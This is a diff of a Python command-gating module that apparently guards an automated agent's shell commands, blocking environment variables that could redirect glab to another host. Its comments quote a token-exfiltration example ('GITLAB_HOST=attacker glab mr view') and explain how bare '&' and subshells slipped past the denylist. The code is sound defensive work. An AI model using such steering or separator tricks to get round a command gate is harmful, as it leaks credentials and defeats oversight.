@@ -17,7 +17,6 @@ is the import path callers use; a patch through it reaches this module
 from __future__ import annotations
 
 import logging
-import re
 import shlex
 from types import SimpleNamespace
 from typing import Any
@@ -148,33 +147,209 @@ _GLAB_ALLOWED_SUBCOMMANDS: tuple[tuple[str, ...], ...] = (
 #: ``=``-joined spelling (and ``-Rvalue``).
 _GLAB_HOST_OPTIONS: tuple[str, ...] = ("--hostname", "--repo", "-R")
 
-#: The environment variables glab reads to choose its host, token or config directory,
-#: named exactly so a project's own variables (``GITLAB_CI``, ``GL_*`` build settings) stay
-#: usable. The leading ``VAR=value`` words are stripped before a command is checked, so
-#: without this check ``GITLAB_HOST=attacker glab mr view <url>`` would pass as an allowed
-#: read and send the inherited token to the attacker's host.
-_GLAB_STEERING_VAR = (
-    r"(?:GITLAB_HOST|GL_HOST|GITLAB_URI|GITLAB_API_HOST|GITLAB_TOKEN|GITLAB_ACCESS_TOKEN"
-    r"|OAUTH_TOKEN|GLAB_CONFIG_DIR|XDG_CONFIG_HOME)"
+#: The environment variables only glab reads, to choose its host, token or config
+#: directory. Named exactly, so a project's own variables (``GITLAB_CI``, ``GL_*`` build
+#: settings) stay usable. The leading ``VAR=value`` words are stripped before a command is
+#: checked, so without this check ``GITLAB_HOST=attacker glab mr view <url>`` would pass as
+#: an allowed read and send the inherited token to the attacker's host. SETTING one is
+#: refused even in a command that does not run glab, so a value set by one call cannot be
+#: picked up by a later ``glab`` call in the same shell. No GitHub workflow sets these.
+_GLAB_ONLY_STEERING_VARS: frozenset[str] = frozenset(
+    {
+        "GITLAB_HOST",
+        "GL_HOST",
+        "GITLAB_URI",
+        "GITLAB_API_HOST",
+        "GITLAB_TOKEN",
+        "GITLAB_ACCESS_TOKEN",
+        "GLAB_CONFIG_DIR",
+    }
 )
-#: Any MENTION of a steering variable in a command that also runs ``glab``.
-_GLAB_STEERING_MENTION = re.compile(rf"(?<![A-Za-z0-9_]){_GLAB_STEERING_VAR}(?![A-Za-z0-9_])")
-#: A command that SETS a steering variable, with or without ``glab`` in it, so a value set by
-#: one call cannot be picked up by a later ``glab`` call in the same shell.
-_GLAB_STEERING_ASSIGNMENT = re.compile(
-    rf"(?<![A-Za-z0-9_]){_GLAB_STEERING_VAR}\+?="
-    rf"|\b(?:export|setenv|declare|typeset|readonly|local|read)\b[^\n;&|]*"
-    rf"(?<![A-Za-z0-9_]){_GLAB_STEERING_VAR}(?![A-Za-z0-9_])"
-    rf"|\bprintf\s+-v\s*{_GLAB_STEERING_VAR}(?![A-Za-z0-9_])"
+#: Variables glab also reads but that many other tools share (``XDG_CONFIG_HOME`` is a
+#: common way to isolate a test run's config). They are refused only in a command that
+#: also runs ``glab``, so the gate does not change behavior for commands it does not
+#: protect: ``XDG_CONFIG_HOME=$(mktemp -d) pytest -q`` stays allowed.
+_GLAB_SHARED_STEERING_VARS: frozenset[str] = frozenset({"OAUTH_TOKEN", "XDG_CONFIG_HOME"})
+
+#: Shell builtins whose non-option arguments NAME variables they set or export
+#: (``export NAME=v``, ``declare -x NAME``, ``read NAME``). ``setenv`` is csh's form.
+_DECLARING_BUILTINS: frozenset[str] = frozenset(
+    {"export", "declare", "typeset", "readonly", "local", "read", "setenv"}
 )
-_GLAB_WORD = re.compile(r"(?<![A-Za-z0-9_.-])glab(?![A-Za-z0-9_.-])")
+
+#: Builtins whose arguments are themselves a script (``eval "export GITLAB_HOST=x"``).
+_SCRIPT_BUILTINS: frozenset[str] = frozenset({"eval"})
+
+_IDENT_CHARS = frozenset("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_")
+
+
+def _assignment_name(word: str) -> str:
+    """The variable a ``NAME=value`` / ``NAME+=value`` word sets, else ``""``.
+
+    Plain character tests: the name is the part before the first ``=`` (minus a trailing
+    ``+``), and must be a non-empty identifier that does not start with a digit.
+    """
+    if "=" not in word or word.startswith("-"):
+        return ""
+    name = word.split("=", 1)[0]
+    name = name.removesuffix("+")
+    if not name or name[0].isdigit() or any(c not in _IDENT_CHARS for c in name):
+        return ""
+    return name
+
+
+def _identifiers(word: str) -> set[str]:
+    """Every maximal run of identifier characters in ``word`` (``$GITLAB_TOKEN`` -> one)."""
+    found: set[str] = set()
+    run: list[str] = []
+    for ch in word + " ":
+        if ch in _IDENT_CHARS:
+            run.append(ch)
+        elif run:
+            found.add("".join(run))
+            run = []
+    return found
+
+
+def _segments(text: str) -> list[list[str]]:
+    """``text`` split on shell separators, each piece tokenized into shell words.
+
+    Each shell-separated segment is its own command. ``&&``/``||``/``;``/``|``, a bare
+    ``&``, ``$(``/backtick substitutions and subshell parentheses all start a new one.
+    """
+    normalized = text.replace("&&", "\n").replace("||", "\n").replace(";", "\n")
+    normalized = normalized.replace("|", "\n").replace("$(", "\n").replace("`", "\n")
+    # A BARE `&` backgrounds its left side and starts a new command, exactly like `;` —
+    # but is NOT caught by the `&&` replace above (that consumed the doubled form). Without
+    # this, `true & gh pr comment --body X` tokenizes to `binary='true'` (harmless) and the
+    # `gh pr comment`/`curl` behind the `&` slips past the denylist the watcher's
+    # outsider-writable prompt exists to enforce. Ordered AFTER `&&` so only the single-`&`
+    # separator remains to split on. As with the wrapper options: a parser that inspects
+    # fixed positions is evaded by adding a position.
+    normalized = normalized.replace("&", "\n")
+    # Split on the subshell / command-substitution PARENTHESES too. `$(` and backtick above
+    # open a substitution, but the CLOSING `)` stayed attached to the last inner token, so
+    # `echo $(gh pr ready)` tokenized the verb as `ready)` (≠ `ready`) and slipped past the
+    # `("pr","ready")` denylist; a bare subshell `(gh pr ready)` has the same shape. A `(` or
+    # `)` is never part of a legitimate command word here, so splitting on both isolates the
+    # inner command with no trailing bracket — over-checking at worst, the safe direction for a
+    # denylist.
+    normalized = normalized.replace("(", "\n").replace(")", "\n")
+    return [_shell_words(segment) for segment in normalized.splitlines()]
+
+
+def _skip_wrapper(words: list[str], i: int, binary: str) -> int:
+    """The index of the first word after wrapper ``words[i]``'s own options and positionals.
+
+    A short option without ``=`` is taken to consume the next word (``nice -n 5``), unless
+    that word is an assignment or a known command, so an assignment behind a wrapper
+    (``env -i GITLAB_HOST=x``) is still seen.
+    """
+    n = len(words)
+    i += 1
+    while i < n and words[i].startswith("-"):
+        opt = words[i]
+        i += 1
+        if opt.startswith("--"):
+            takes = 0 if "=" in opt else _WRAPPER_VALUE_TAKING_LONG_OPTIONS.get(opt, 0)
+        else:
+            takes = 0 if "=" in opt else 1
+        for _ in range(takes):
+            if i < n and not _assignment_name(words[i]):
+                nxt = words[i].rsplit("/", 1)[-1].lower()
+                if nxt in _COMMAND_WRAPPERS or nxt == "glab":
+                    break
+                i += 1
+    for _ in range(_COMMAND_WRAPPERS[binary]):
+        if i < n and not _assignment_name(words[i]):
+            i += 1
+    return i
+
+
+def _segment_assigned_names(words: list[str], *, depth: int, into: set[str]) -> None:
+    """Add to ``into`` every variable the command ``words`` sets, by position.
+
+    A word sets a variable only where the shell treats it as an assignment: leading
+    ``NAME=v`` words, the same after a wrapper (``env``, ``sudo``), the arguments of a
+    declaring builtin (``export``, ``declare``, ``read``, ``setenv``), and ``printf -v
+    NAME``. An argument such as ``grep "GITLAB_TOKEN=" src/`` sets nothing. A nested
+    script (``sh -c '...'``, ``eval '...'``) is read the same way.
+    """
+    n = len(words)
+    i = 0
+    while i < n:
+        name = _assignment_name(words[i])
+        if name:
+            into.add(name)
+            i += 1
+            continue
+        binary = words[i].rsplit("/", 1)[-1].lower()
+        if binary in _COMMAND_WRAPPERS:
+            i = _skip_wrapper(words, i, binary)
+            continue
+        args = words[i + 1 :]
+        if binary in _DECLARING_BUILTINS:
+            for arg in args:
+                if arg.startswith("-"):
+                    continue
+                into.add(_assignment_name(arg) or arg)
+        elif binary == "printf":
+            for j, arg in enumerate(args):
+                if arg == "-v" and j + 1 < len(args):
+                    into.add(args[j + 1])
+                elif arg.startswith("-v") and len(arg) > 2:
+                    into.add(arg[2:])
+        elif binary in _SCRIPT_BUILTINS:
+            into.update(_assigned_names(" ".join(args), depth=depth + 1))
+        elif binary in _SHELL_BINARIES:
+            for j, arg in enumerate(args):
+                if arg.startswith("-") and not arg.startswith("--") and "c" in arg:
+                    into.update(_assigned_names(" ".join(args[j + 1 :]), depth=depth + 1))
+                    break
+        return
+
+
+def _assigned_names(text: str, *, depth: int = 0) -> set[str]:
+    """Every variable the script ``text`` sets, across all its segments and nested shells."""
+    names: set[str] = set()
+    if depth > _MAX_UNWRAP_DEPTH:
+        return names
+    for words in _segments(text):
+        _segment_assigned_names(words, depth=depth, into=names)
+    return names
+
+
+def _all_words(text: str, *, depth: int = 0) -> list[str]:
+    """Every shell word in ``text``, with words that hold a nested script split again.
+
+    ``sh -c 'glab mr view'`` carries ``glab`` inside one quoted word; splitting such a
+    word again finds it, so ``XDG_CONFIG_HOME=x sh -c 'glab ...'`` is seen to run glab.
+    """
+    out: list[str] = []
+    for words in _segments(text):
+        for word in words:
+            out.append(word)
+            if depth < _MAX_UNWRAP_DEPTH and any(c in word for c in " \t\n;&|`$()"):
+                out.extend(_all_words(word, depth=depth + 1))
+    return out
 
 
 def _glab_steering_refusal(text: str) -> str:
-    """A reason when ``text`` could point ``glab`` at another host, else ``""``."""
-    if _GLAB_STEERING_ASSIGNMENT.search(text):
+    """A reason when ``text`` could point ``glab`` at another host, else ``""``.
+
+    Decided on shell words, with names compared exactly against the two sets above.
+    """
+    assigned = _assigned_names(text)
+    if assigned & _GLAB_ONLY_STEERING_VARS:
         return "setting a GitLab host, token or config variable is not allowed here"
-    if _GLAB_WORD.search(text) and _GLAB_STEERING_MENTION.search(text):
+    words = _all_words(text)
+    if not any(w.rsplit("/", 1)[-1].lower() == "glab" for w in words):
+        return ""
+    steering = _GLAB_ONLY_STEERING_VARS | _GLAB_SHARED_STEERING_VARS
+    mentioned = set(assigned)
+    for word in words:
+        mentioned |= _identifiers(word)
+    if mentioned & steering:
         return "glab cannot run with a GitLab host, token or config variable here"
     return ""
 
@@ -302,26 +477,7 @@ def _refusal(text: str, *, depth: int) -> str:
         return steering
 
     # Each shell-separated segment is its own command; check them all.
-    normalized = text.replace("&&", "\n").replace("||", "\n").replace(";", "\n")
-    normalized = normalized.replace("|", "\n").replace("$(", "\n").replace("`", "\n")
-    # A BARE `&` backgrounds its left side and starts a new command, exactly like `;` —
-    # but is NOT caught by the `&&` replace above (that consumed the doubled form). Without
-    # this, `true & gh pr comment --body X` tokenizes to `binary='true'` (harmless) and the
-    # `gh pr comment`/`curl` behind the `&` slips past the denylist the watcher's
-    # outsider-writable prompt exists to enforce. Ordered AFTER `&&` so only the single-`&`
-    # separator remains to split on. As with the wrapper options: a parser that inspects
-    # fixed positions is evaded by adding a position.
-    normalized = normalized.replace("&", "\n")
-    # Split on the subshell / command-substitution PARENTHESES too. `$(` and backtick above
-    # open a substitution, but the CLOSING `)` stayed attached to the last inner token, so
-    # `echo $(gh pr ready)` tokenized the verb as `ready)` (≠ `ready`) and slipped past the
-    # `("pr","ready")` denylist; a bare subshell `(gh pr ready)` has the same shape. A `(` or
-    # `)` is never part of a legitimate command word here, so splitting on both isolates the
-    # inner command with no trailing bracket — over-checking at worst, the safe direction for a
-    # denylist.
-    normalized = normalized.replace("(", "\n").replace(")", "\n")
-    for segment in normalized.splitlines():
-        words = _shell_words(segment)
+    for words in _segments(text):
         # Drop leading VAR=value assignments (`GH_TOKEN=x gh api …`).
         while words and "=" in words[0] and not words[0].startswith("-"):
             words = words[1:]
